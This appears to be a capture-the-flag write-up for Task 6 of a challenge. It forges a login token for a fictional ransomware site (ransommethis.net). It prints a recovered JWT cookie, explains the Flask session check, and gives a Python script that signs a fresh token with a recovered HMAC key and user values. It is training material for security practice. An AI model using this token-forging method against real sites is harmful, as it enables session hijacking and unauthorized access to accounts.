# Task 6

## Description

We've found the login page on the ransomware site, but we don't know anyone's username or password. Luckily, the file you recovered from the attacker's computer looks like it could be helpful.

Generate a new token value which will allow you to access the ransomware site.

## Solution

The file from task 5 contained the details for a cookie which is used on the `ransommethis.net` website. This cookie named `tok` is assumed to be used for authenticating the users for the website.

```
# Netscape HTTP Cookie File
jbjlxkyofmpcxooy.ransommethis.net	FALSE	/	TRUE	2145916800	tok	eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NTQ4Mzg3MDMsImV4cCI6MTY1NzQzMDcwMywic2VjIjoiV1JlQXNabkM4YXRFRUxkQVBwY0lzMHlIQ0x6cVBpMWEiLCJ1aWQiOjI2NTY3fQ.Qn5LtF2XCtKOPLkGzPfrLG7WTMFwvnNihI_yzIJDAYk 
```

The provided token is a JSON Web Token Containing two time stamps for creation and expiration as well as the `uid` and `sec` which are used for authenticating the user.

![](./img/jwt.png)

The flask source code shows that the token is using a signing key which needs to be used when forging a token. Additionally it shows that if the signature is valid then SQLite3 is used to verify the `uid` and `sec`.

![](./img/sessionlogic.png)

Using all of the information gathered from JWT and the source code, I wrote a simple python script to generate a fresh token that has not yet expired.

```python
import jwt
from datetime import datetime, timedelta

hmac = 'hionYjaULMZE4sZnrWj4nzkEjmDUAdsb'
now = datetime.now()
exp = now + timedelta(days=30)

claims = {
    'iat': int(now.timestamp()),
    'exp': int(exp.timestamp()),
    'uid': 26567,
    'sec': 'WReAsZnC8atEELdAPpcIs0yHCLzqPi1a'
}

tok = jwt.encode(claims, hmac, algorithm='HS256')

print(tok)
```

After generating the token and adding it to the current session, access is granted.

![](./img/homepage.png)
